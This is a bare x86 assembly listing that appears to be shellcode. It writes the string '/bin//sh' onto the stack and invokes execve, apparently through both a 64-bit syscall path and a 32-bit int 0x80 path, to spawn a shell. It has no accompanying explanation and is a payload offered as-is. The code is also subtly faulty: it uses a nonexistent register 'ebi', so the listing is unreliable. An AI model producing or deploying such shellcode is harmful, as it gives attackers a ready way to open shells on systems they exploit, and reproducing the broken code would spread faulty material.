.intel_syntax noprefix
    xor     esi, esi
    mul     esi
    push    edx
    push    edx
    push    edx
    push    esp
    pop     ebx
    push    ebx
    pop     edi
    mov     dword ptr[edi], 0x6e69622f
    mov     dword ptr[edi + 0x4], 0x68732f2f
    test    eax, eax
    inc     eax
    jnz     x32
    mov     ebi, esi
    xor     ecx, ecx
    xor     esi, esi
    syscall
x32:
    xor     ecx, ecx
    xor     edx, edx
    mov     eax, 11
    int     0x80
